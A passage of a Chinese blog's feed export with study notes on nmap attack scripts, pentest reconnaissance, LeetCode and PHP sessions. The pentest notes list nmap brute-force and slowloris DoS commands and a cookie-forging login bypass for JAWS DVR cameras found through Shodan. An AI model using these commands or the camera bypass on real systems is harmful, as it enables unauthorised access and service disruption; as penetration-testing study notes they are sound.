pgsql-brute 192.168.137.4 <code>pgsql破解</code><br>nmap -sU –script snmp-brute 192.168.137.4 <code>snmp破解</code><br>nmap -sV –script=telnet-brute 192.168.137.4 <code>telnet破解</code><br>nmap –script=http-vuln-cve2010-0738 –script-args ‘http-vuln-cve2010-0738.paths={/path1/,/path2/}’  <code>jboss autopwn</code><br>nmap –script=http-methods.nse 192.168.137.4 <code>检查http方法</code><br>nmap –script http-slowloris –max-parallelism 400 192.168.137.4 <code>dos攻击</code>，对于处理能力较小的站点还挺好用的 ‘half-HTTP’ connections<br>nmap –script=samba-vuln-cve-2012-1182 -p 139 192.168.137.4</p></blockquote><h5 id="不靠谱的脚本："><a href="#不靠谱的脚本：" class="headerlink" title="不靠谱的脚本："></a>不靠谱的脚本：</h5><blockquote><p>vnc-brute 次数多了会禁止连接<br>pcanywhere-brute 同上</p></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2020/08/03/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2020/08/03/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><blockquote><p>在线的Web靶机：<a href="http://www.testfire.net、http//vulnweb.com/">www.testfire.net、http://vulnweb.com/</a></p></blockquote><h3 id="一、渗透测试流程"><a href="#一、渗透测试流程" class="headerlink" title="一、渗透测试流程"></a>一、渗透测试流程</h3><p><a href="https://imgchr.com/i/aUJPCd"><img src="https://s1.ax1x.com/2020/08/03/aUJPCd.png" alt="aUJPCd.png"></a></p><h3 id="二、域名注册信息收集"><a href="#二、域名注册信息收集" class="headerlink" title="二、域名注册信息收集"></a>二、域名注册信息收集</h3><blockquote><p>通过whois查询到站长的信息，比如姓名、地址、电话、邮箱，可以组成社工字典进行爆破</p></blockquote><p>1、站长之家IPWhois：域名注册信息、注册商、注册人员(whois反查)、联系方式、邮箱、子域名等。</p><p>2、Kali内置工具：Whois。</p><p>3、服务器信息查询网站：netcraft.com</p><p>4、钟馗之眼：<a href="http://www.zoomeye.org/">www.zoomeye.org</a></p><h3 id="三、收集子域名信息（一个域名下所有主机的信息）"><a href="#三、收集子域名信息（一个域名下所有主机的信息）" class="headerlink" title="三、收集子域名信息（一个域名下所有主机的信息）"></a>三、收集子域名信息（一个域名下所有主机的信息）</h3><p>1、通过Https证书信息中的使用者备用名称查询</p><p>2、主流信息查询网站：netcraft.com</p><p>3、Layer子域名挖掘机软件：需要字典爆破。（优势是可爆破网站上查询不到的域名）</p><p>4、Kali内置子域名爆破工具：dnsrecon</p><blockquote><p><code>dnsrecon -d 域名 -t brt(强硬暴力的扫描)</code></p><p>按照字典爆破：<code>dnsrecon -d 域名 -D 字典路径/字典文件名 -t brt</code></p></blockquote><h3 id="四、从DNS服务器中查询IP"><a href="#四、从DNS服务器中查询IP" class="headerlink" title="四、从DNS服务器中查询IP"></a>四、从DNS服务器中查询IP</h3><p>1、<code>ping</code>、<code>nslookup</code>：但其实两者并不是权威的解答。</p><p>2、Kali工具<code>dig</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`dig @DNS服务器地址 需查询的域名`</span><br><span class="line">`dig +trace 需查询的域名`    #详细显示DNS解析过程</span><br></pre></td></tr></table></figure><blockquote><p>223.5.5.5 阿里DNS服务器、8.8.8.8 google提供的DNS服务器</p></blockquote><p>3、Kali工具 <code>dnsenum</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`dnsenum 域名` #特点：自动检测域传送漏洞</span><br><span class="line"><span class="meta">#</span><span class="bash">域传送漏洞DNS zone transfer：通常一台备用服务器会使用来自主服务器的数据刷新自己的域（zone）数据库。当主服务器出现故障时，备用服务器就自动顶替主服务器提供域名解析服务。而域传送漏洞就是主DNS服务器的错误配置，导致任何人都可以用次DNS服务器的身份去索要数据。这就导致了DNS服务器的数据信息泄露。</span></span><br></pre></td></tr></table></figure><h3 id="五、CDN技术"><a href="#五、CDN技术" class="headerlink" title="五、CDN技术"></a>五、CDN技术</h3><h4 id="1、什么是CDN？"><a href="#1、什么是CDN？" class="headerlink" title="1、什么是CDN？"></a>1、什么是CDN？</h4><p>CDN：Content Delivery Network或Content Distribute Network，即内容分发网络。CDN是将源站内容分发至最接近用户的节点，使用户可就近取得所需内容，提高用户访问的响应速度和成功率。解决因分布、带宽、服务器性能带来的访问延迟问题，适用于站点加速、点播、直播等场景。最简单的CDN网络由一个DNS服务器和几台缓存服务器组成。</p><h4 id="2、CDN的特点"><a href="#2、CDN的特点" class="headerlink" title="2、CDN的特点"></a>2、CDN的特点</h4><p>使用了CDN技术的网站，很难查询到目标网站的真实IP网址。</p><h4 id="3、如何判断目标网站是否使用CDN技术"><a href="#3、如何判断目标网站是否使用CDN技术" class="headerlink" title="3、如何判断目标网站是否使用CDN技术"></a>3、如何判断目标网站是否使用CDN技术</h4><p>1）通过在线的多地ping工具，查看从多地ping目标域名的IP地址是否都相同。相同则无CDN，不相同大概率CDN</p><p>2)nslookup，如果返回域名解析对应多个IP多半使用了CDN。<a href="http://tool.chinaz.com/nslookup">http://tool.chinaz.com/nslookup</a></p><h4 id="4、如何获得使用CDN技术的网站服务器IP"><a href="#4、如何获得使用CDN技术的网站服务器IP" class="headerlink" title="4、如何获得使用CDN技术的网站服务器IP"></a>4、如何获得使用CDN技术的网站服务器IP</h4><p>1）如果是一开始没用CDN技术，后来使用了，就可以查询历史的DNS信息，找到它的IP。</p><p>2）想方设法让对方网站给我们发送、推送信息，来获得其真实IP。</p><h3 id="六、通过IP查询网站信息"><a href="#六、通过IP查询网站信息" class="headerlink" title="六、通过IP查询网站信息"></a>六、通过IP查询网站信息</h3><p><a href="http://www.webscan.cc/">http://www.webscan.cc/</a></p><p>1、旁站查询/同IP网站查询(站长之家)：通过IP来查询所有使用该IP的网站域名，这些网站都在同一个服务器上。</p><p><a href="http://s.tool.chinaz.com/same">http://s.tool.chinaz.com/same</a></p><p><a href="http://www.114best.com/ip/114.aspx?w=">http://www.114best.com/ip/114.aspx?w=</a></p><p>2、C段查询：就是查询和目标IP处于同一个网段的IP，X.X.X.*，攻破它，再内网攻击目标。一般是服务器集群。</p><h3 id="七、Google-hacking搜索引擎语法"><a href="#七、Google-hacking搜索引擎语法" class="headerlink" title="七、Google hacking搜索引擎语法"></a>七、Google hacking搜索引擎语法</h3><h4 id="1、基本命令"><a href="#1、基本命令" class="headerlink" title="1、基本命令"></a>1、基本命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">intitle:    从网页标题中搜索指定的关键字</span><br><span class="line">inurl:        从url中搜索指定的关键字（login）</span><br><span class="line">intext:        从网页中搜索指定的关键字</span><br><span class="line">filetype:    搜索指定的文件后缀（pdf）</span><br><span class="line">site:        搜索指定域名的网站</span><br><span class="line">link:        搜索与该链接有关的链接</span><br></pre></td></tr></table></figure><h4 id="2、通配符"><a href="#2、通配符" class="headerlink" title="2、通配符"></a>2、通配符</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+            强制包含某个字符进行查询</span><br><span class="line">-            查询时忽略某个字符</span><br><span class="line">&quot;&quot;            查询时精确匹配双引号内的字符</span><br><span class="line">.            匹配某单个字符进行查询</span><br><span class="line">*            匹配任意字符进行查询</span><br><span class="line">|            或者逗号(,)多个选择,只要有一个关键字匹配即可</span><br></pre></td></tr></table></figure><blockquote><p>搜索phpinfo：<code>intext:&quot;PHP Version&quot; exit:php intest:&quot;disabled&quot; intext:&quot;BuildDate&quot; ......</code>；</p><p>​        <code>ext:php intitle:phpinfo &quot;published by the PHP Group&quot;</code></p><p>php探针：<code>intitle:&quot;php 中文网探针2014&quot;</code></p></blockquote><h3 id="八、钟馗之眼zoomeye"><a href="#八、钟馗之眼zoomeye" class="headerlink" title="八、钟馗之眼zoomeye"></a>八、钟馗之眼zoomeye</h3><blockquote><p><a href="http://www.zoomeye.org/">www.zoomeye.org</a></p></blockquote><p>ZoomEye 是一个跟shodan一样面向网络空间的搜索引擎。</p><p>ZoomEye 支持公网设备指纹检索和 Web 指纹检索。网站指纹包括应用名、版本、前端框架、后端框架、服务端语言、服务器操作系统、网站容器、内容管理系统和数据库等。设备指纹包括应用名、版本、开放端口、操作系统、服务名、地理位置等直接输入关键词即可开始检索。</p><p>搜索IIS7.0组件<code>aap:&quot;Microsoft IIS httpd&quot; ver:&quot;7.0&quot;</code>、port：””、os：””、city：””、country：””…</p><h3 id="九、Shodan"><a href="#九、Shodan" class="headerlink" title="九、Shodan"></a>九、Shodan</h3><blockquote><p><a href="http://www.shodan.io/">www.shodan.io</a></p></blockquote><p>可以搜索<code>JAWS/1.1</code>获得所有相关摄像头的地址信息，JAWS/1.0(1.1)的js源码有漏洞：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> </span><br><span class="line">dvr_camcnt = Cookies.get(“dvr_camcnt”);</span><br><span class="line"> </span><br><span class="line">dvr_usr = Cookies.get(“dvr_usr”);</span><br><span class="line"> </span><br><span class="line">dvr_pwd = Cookies.get(“dvr_pwd”);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(dvr_camcnt == <span class="literal">null</span> || dvr_usr == <span class="literal">null</span> || dvr_pwd == <span class="literal">null</span>)</span><br><span class="line"> </span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line">location.href = “/index.html”;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要cookie的dvr_camcnt和dvr_usr和dvr_pwd不为空，就可以成功登录，dvr_camcnt是自动填写的。所以，只要使用js添加上cookie，就可成功绕过身份验证，成功登录。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie=<span class="string">&quot;dvr_usr=admin&quot;</span>;</span><br><span class="line"><span class="built_in">document</span>.cookie=<span class="string">&quot;dvr_pwd=123&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="十、浏览器实用插件推荐"><a href="#十、浏览器实用插件推荐" class="headerlink" title="十、浏览器实用插件推荐"></a>十、浏览器实用插件推荐</h3><p>网站信息查询插件：<code>netcraft extension</code>，依托于Netcraft自己的数据库</p><p>查询网站架构插件：<code>wappalyzer</code></p><h3 id="十一、信息收集的其它方式"><a href="#十一、信息收集的其它方式" class="headerlink" title="十一、信息收集的其它方式"></a>十一、信息收集的其它方式</h3><h4 id="1、邮件-RSS邮件订阅"><a href="#1、邮件-RSS邮件订阅" class="headerlink" title="1、邮件/RSS邮件订阅"></a>1、邮件/RSS邮件订阅</h4><p>目标服务器的公司有可能会自己搭建一个邮件服务器，在邮件源码中会有邮件服务器的IP，可以扫描邮件服务器的网段，来找到对外提供服务的服务器。</p><h4 id="2、网站漏洞的查找"><a href="#2、网站漏洞的查找" class="headerlink" title="2、网站漏洞的查找"></a>2、网站漏洞的查找</h4><p>1）目标敏感文件泄露，例如phpinfo之类的探针、Github源码信息泄露等。</p><p>2）XSS盲打，命令执行反弹shell，SSRF等</p><p>3）社工或者其它手段，拿到目标网站管理员在CDN的账号从CDN配置中找到网站的真实IP</p><h4 id="3、APP"><a href="#3、APP" class="headerlink" title="3、APP"></a>3、APP</h4><p>如果目标网站有自己的APP，可以通过fiddler或BurpSuite抓取APP数据包，找到真实IP</p><h4 id="4、网络空间搜索引擎"><a href="#4、网络空间搜索引擎" class="headerlink" title="4、网络空间搜索引擎"></a>4、网络空间搜索引擎</h4><p>常见的shodan，fofa搜索。以fofa为例，title:网站title关键字、body:网站的body特征，就可以找到fofa收录的有这些关键字的IP域名，有时可以获得真实IP</p><h4 id="5、查找目标IP的地理位置"><a href="#5、查找目标IP的地理位置" class="headerlink" title="5、查找目标IP的地理位置"></a>5、查找目标IP的地理位置</h4><p><a href="http://www.chaipip.com/">www.chaipip.com</a></p><h3 id="十二、常见端口"><a href="#十二、常见端口" class="headerlink" title="十二、常见端口"></a>十二、常见端口</h3><p>21、22、3389、5632端口(Pcanywhere)、5900端口(VNC)、</p><p>WEB中间件服务端口1090/1099端口(RMI)：JAVA RMI 反序列化远程命令漏洞</p><p>WEB中间件服务端口7001端口（Weblogic）：弱口令、SSRF、反序列化</p><p>WEB中间件服务端口8000端口（jdwp）：JDWP远程命令执行漏洞</p><p>WEB中间件服务端口8080端口（Tomcat）：弱口令、示例目录、CVE漏洞（Tomcat任意文件上传、远程代码执行&amp;信息泄露、Tomcat幽灵猫）</p><p>WEB中间件服务端口8080端口（Jboss）：未授权访问、反序列化</p><p>数据库服务端口1433端口（Mssql）：弱口令、暴力破解（差异备份getshell、SA账户提权等）</p><p>数据库服务端口1521端口（Oracle）：弱口令、暴力破解</p><p>数据库服务端口3306端口（MySQL）：弱口令、暴力破解（利用日志写入webshell、udf提权、mof提权等）</p><p>数据库服务端口5432 端口（PostgreSQL）：弱口令、高权限命令执行（攻击者通过弱口令获取账号信息，连入postgres中，可执行系统命令）</p><p>数据库服务端口6379端口（Redis）：未授权访问（绝对路径写webshell 、利用计划任务执行命令反弹shell、公私钥认证获取root权限、主从复制RCE等）</p><p>数据库服务端口27017端口（Mongodb）：未授权访问、弱口令（未授权访问/弱口令，远程连入数据库，导致敏感信息泄露）</p><p>常见协议端口21 端口（FTP)：配置不当、明文传输、第三方软件提权（1、匿名登录或弱口令2、嗅探ftp用户名和密码3、Serv-U权限较大的账号可导致系统命令执行）</p><p>常见协议端口25 端口（SMTP)：匿名发送邮件、弱口令、SMTP用户枚举（1、SMTP服务器配置不当，攻击者可以使用任意用户发送邮件。2、SMTP弱口令扫描，获取用户账号密码，发送邮件钓鱼。3、通过SMTP用户枚举获取用户名）</p><p>常见协议端口53端口（DNS)：DNS域传送漏洞、DNS欺骗、DNS缓存投毒（1、DNS域传送漏洞，Windows下检测使用nslookup命令，Linux下检测使用dig命令，通过执行命令可以清楚的看到域名解析情况。2、DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。3、DNS缓存投毒是攻击者欺骗DNS服务器相信伪造的DNS响应的真实性。）</p><p>常见协议端口443端口（SSL)：OpenSSL 心脏出血（攻击者可以远程读取存在漏洞版本的openssl服务器内存中长大64K的数据）</p><p>常见协议端口445端口（SMB)：信息泄露、远程代码执行（可利用共享获取敏感信息、缓冲区溢出导致远程代码执行）</p><p>常见协议端口873端口（Rsync)：匿名访问、弱口令（攻击者可以执行下载/上传等操作，也可以尝试上传webshell）</p><p>常见协议端口2375端口（Docker)：未授权方式、容器逃逸（检测方式：通过docker daemon api 执行docker命令）</p><h3 id="十三、判断目标服务器的操作系统"><a href="#十三、判断目标服务器的操作系统" class="headerlink" title="十三、判断目标服务器的操作系统"></a>十三、判断目标服务器的操作系统</h3><p>1、可以通过url分辨，Linux的URL严格区分大小写</p><p>2、Ping值</p><h3 id="十四、判断目标服务器架构、CMS"><a href="#十四、判断目标服务器架构、CMS" class="headerlink" title="十四、判断目标服务器架构、CMS"></a>十四、判断目标服务器架构、CMS</h3><p>Kali：<code>whatweb XXX </code></p><p>常见CMS：Dedecms（织梦）、Discuz、ECShopWordPress等。</p><p>查询网站：<a href="http://whatweb.bugscaner.com/look/%E3%80%81http://www.yunsee.cn/finger.html">http://whatweb.bugscaner.com/look/、http://www.yunsee.cn/finger.html</a></p><h3 id="十五、渗透测试相关的POC开源项目"><a href="#十五、渗透测试相关的POC开源项目" class="headerlink" title="十五、渗透测试相关的POC开源项目"></a>十五、渗透测试相关的POC开源项目</h3><p><a href="http://www.github.com/Mr-xn/Penetration_Testing_POC">www.github.com/Mr-xn/Penetration_Testing_POC</a></p><h3 id="十六、内网信息搜集"><a href="#十六、内网信息搜集" class="headerlink" title="十六、内网信息搜集"></a>十六、内网信息搜集</h3><p>Kali工具：<code>netdiscover</code></p><h3 id="十七、目标网站目录搜集"><a href="#十七、目标网站目录搜集" class="headerlink" title="十七、目标网站目录搜集"></a>十七、目标网站目录搜集</h3><p>1、dirsearch脚本：<code>python3 dirsearch -u http:/XX -e .txt,php,html,json</code></p>]]></content>
      
      
      <categories>
          
          <category> Web渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>62-动态规划</title>
      <link href="/2020/08/01/Leetcode/62%E3%80%81%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
      <url>/2020/08/01/Leetcode/62%E3%80%81%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</url>
      
        <content type="html"><![CDATA[<h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><p><a href="https://leetcode-cn.com/problems/unique-paths/">https://leetcode-cn.com/problems/unique-paths/</a></p><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><p><a href="https://imgchr.com/i/aGsHcd"><img src="https://s1.ax1x.com/2020/08/01/aGsHcd.png" alt="aGsHcd.png"></a></p><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>题目重点是：1、机器人只能向右或向下走；2、机器人一定在左上角，目标一定在右上角。因此，机器人一定要走m+n-2步，并且必须向下走n-1步、向右走m-1步。将问题可转换为排列组合问题。</p><p><a href="https://imgchr.com/i/aGggPK"><img src="https://s1.ax1x.com/2020/08/01/aGggPK.png" alt="aGggPK.png"></a></p><p>根据公式，即可完成，(n-m)!代入本题的值，化简等于(m-1)!</p><p><a href="https://imgchr.com/i/aGyluR"><img src="https://s1.ax1x.com/2020/08/01/aGyluR.png" alt="aGyluR.png"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">uniquePaths</span>(<span class="params">self, m: int, n: int</span>) -&gt; int:</span></span><br><span class="line">        <span class="keyword">return</span> int(math.factorial(n+m<span class="number">-2</span>)/(math.factorial(n<span class="number">-1</span>)*math.factorial(m<span class="number">-1</span>)))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8、PHP-Mysqli</title>
      <link href="/2020/08/01/%E9%98%B6%E6%AE%B5%E4%B8%89%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/8%E3%80%81PHP-Mysqli/"/>
      <url>/2020/08/01/%E9%98%B6%E6%AE%B5%E4%B8%89%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/8%E3%80%81PHP-Mysqli/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP-Mysqli"><a href="#PHP-Mysqli" class="headerlink" title="PHP-Mysqli"></a>PHP-Mysqli</h2><h3 id="一、数据库的设计"><a href="#一、数据库的设计" class="headerlink" title="一、数据库的设计"></a>一、数据库的设计</h3><p>users：id 主键、非空、自增、username、password、money、photo</p><h3 id="二、Mysqli基本操作"><a href="#二、Mysqli基本操作" class="headerlink" title="二、Mysqli基本操作"></a>二、Mysqli基本操作</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysqli_connect(host,username,password,dbname,port,socket); =&gt; 句柄</span><br><span class="line"><span class="keyword">echo</span> mysqli_connect_error();    <span class="comment">#捕获Mysql控制台连接相关错误信息</span></span><br><span class="line"><span class="keyword">echo</span> mysqli_error();    <span class="comment">#捕获Mysql控制台错误信息</span></span><br><span class="line">mysqli_query($句柄变量, $语句变量);    =&gt; <span class="keyword">object</span>(sql结果集) <span class="comment">#执行Mysql语句的命令</span></span><br><span class="line">mysqli_fetch_assoc($sql结果集); =&gt; 以关联数组的形式返回当前未取出的一条结果集内容</span><br><span class="line">mysqli_fetch_row($sql结果集); =&gt; 以索引数组的形式返回当前未取出的一条结果集内容</span><br><span class="line">mysqli_fetch_all($sql结果集); =&gt; 以索引数组的形式返回所有结果集内容</span><br><span class="line">mysqli_num_rows($sql结果集);    <span class="comment">#获得结果集的行数</span></span><br><span class="line">mysqli_close($句柄变量);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7、PHP的Cookie与Session操作</title>
      <link href="/2020/08/01/%E9%98%B6%E6%AE%B5%E4%B8%89%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/7%E3%80%81PHP%E7%9A%84Cookie%E6%93%8D%E4%BD%9C/"/>
      <url>/2020/08/01/%E9%98%B6%E6%AE%B5%E4%B8%89%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/7%E3%80%81PHP%E7%9A%84Cookie%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP的Cookie与Session操作"><a href="#PHP的Cookie与Session操作" class="headerlink" title="PHP的Cookie与Session操作"></a>PHP的Cookie与Session操作</h2><h3 id="一、什么是Cookie？"><a href="#一、什么是Cookie？" class="headerlink" title="一、什么是Cookie？"></a>一、什么是Cookie？</h3><p>Cookie是存储在客户端的一段缓存信息，一般包括服务器发送给客户端的身份验证token/Session等，由于Http无状态、无连接的特性，每当有客户端想与服务器进行数据请求等操作时，就很有可能有伪装的hacker冒充正当人员向服务器发送请求来做坏事。因此，为了保证通信的安全性，大部分的网络架构都设计服务器发送给客户端一串唯一的加密过的token字符串/或者Session，这个token/Session是有有效时间限制的(一般只在一个请求和一个响应中有效)。这样，每当客户端向服务器发送请求时，就可以携带这个服务器发送的token/Session字符串，来证明自己身份的正当性了。</p><blockquote><p><strong>什么是Session？</strong></p><p>Session是一种会话管理技术，服务器将每对连接会话所产生的键值信息保存到一个名为session id（唯一随机字符串）的缓存文件中，并将这个session id返回给客户端在Cookie中保存，在这段会话连接中客户端向服务器发送数据请求时会携带这个session id，服务器根据session id来对会话数据进行访问。</p><p><strong>php session 有效期</strong></p><p>php的session有效期默认是1440秒(24分钟)，如果客户端超过24分钟没有刷新，当前session会被回收，失效。<br>当用户关闭浏览器，会话结束，session也会失效。</p><p>可以修改php.ini的session.gc_maxlifetime来设置session的生命周期，但并不能保证在超过这一时间后session信息立即会删除。因为GC是按机率启动的，可能在某一个长时间内都没有被启动。那么大量的session在超过session.gc_maxlifetime后仍然有效。</p></blockquote><h3 id="二、PHP的Cookie相关操作"><a href="#二、PHP的Cookie相关操作" class="headerlink" title="二、PHP的Cookie相关操作"></a>二、PHP的Cookie相关操作</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;-----服务器发送Cookie-----&gt;</span><br><span class="line">setcookie(name, value, expire, path, domain, secure，httponly) =&gt; <span class="keyword">bool</span></span><br><span class="line"><span class="comment"># name：Cookie名称</span></span><br><span class="line"><span class="comment"># value：Cookie值</span></span><br><span class="line"><span class="comment"># expire：过期时间,是一个Unix时间戳，使用time()获得Unix纪元时间</span></span><br><span class="line"><span class="comment"># path：有效的服务器路径</span></span><br><span class="line"><span class="comment"># domain：发放Cookie的服务器域名</span></span><br><span class="line"><span class="comment"># secure：True表示只在https中传输Cookie给客户端</span></span><br><span class="line"><span class="comment"># httponly：仅支持HTTP协议访问Cookie值，不支持JS等脚本访问，为了防止XSS</span></span><br><span class="line">    </span><br><span class="line">&lt;-----服务器接受与访问Cookie-----&gt;</span><br><span class="line">$_COOKIE</span><br></pre></td></tr></table></figure><h3 id="三、PHP的Session相关操作"><a href="#三、PHP的Session相关操作" class="headerlink" title="三、PHP的Session相关操作"></a>三、PHP的Session相关操作</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session_start();    <span class="comment">#此php页面开启session机制，下发和验证session；也可以配置文件开启此功能，可参考手册</span></span><br><span class="line">$_SESSION    <span class="comment">#对此段会话连接中的SESSION数据的访问与写入</span></span><br><span class="line">session_destory();    <span class="comment">#销毁当断会话数据</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>61-旋转链表</title>
      <link href="/2020/07/31/Leetcode/61%E3%80%81%E6%97%8B%E8%BD%AC%E9%93%BE%E8%A1%A8/"/>
      <url>/2020/07/31/Leetcode/61%E3%80%81%E6%97%8B%E8%BD%AC%E9%93%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="61、旋转链表"><a href="#61、旋转链表" class="headerlink" title="61、旋转链表"></a>61、旋转链表</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><p><a href="https://imgchr.com/i/a1V4KO"><img src="https://s1.ax1x.com/2020/07/31/a1V4KO.png" alt="a1V4KO.png"></a></p><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>此题比较简单，思路也比较明确。本来我的思路是直接遍历到 n - k%n -1 的位置将next复制一份后指向None，然后用复制的继续遍历到屁股指向head。</p><p>但看了题解发现，先遍历一般把屁股指向头形成环形 并顺便把链表长度计算一下，然后再到 n - k%n -1 的位置把next当新的头并将next指向None，也可以。</p><p>最终选择官方题解的方法，其实没什么区别，先连头后连头罢了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rotateRight</span>(<span class="params">self, head: ListNode, k: int</span>) -&gt; ListNode:</span></span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span> <span class="keyword">or</span> head == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> head</span><br><span class="line">        n = <span class="number">1</span></span><br><span class="line">        old_tail = head</span><br><span class="line">        <span class="keyword">while</span> old_tail.next:</span><br><span class="line">            old_tail = old_tail.next</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">        old_tail.next = head</span><br><span class="line">        new_tail = head</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n - k % n - <span class="number">1</span>):</span><br><span class="line">            new_tail = new_tail.next</span><br><span class="line">        new_head=new_tail.next</span><br><span class="line">        new_tail.next = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> new_head</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>60-第k个排列</title>
      <link href="/2020/07/30/Leetcode/60%E3%80%81%E7%AC%ACk%E4%B8%AA%E6%8E%92%E5%88%97/"/>
      <url>/2020/07/30/Leetcode/60%E3%80%81%E7%AC%ACk%E4%B8%AA%E6%8E%92%E5%88%97/</url>
      
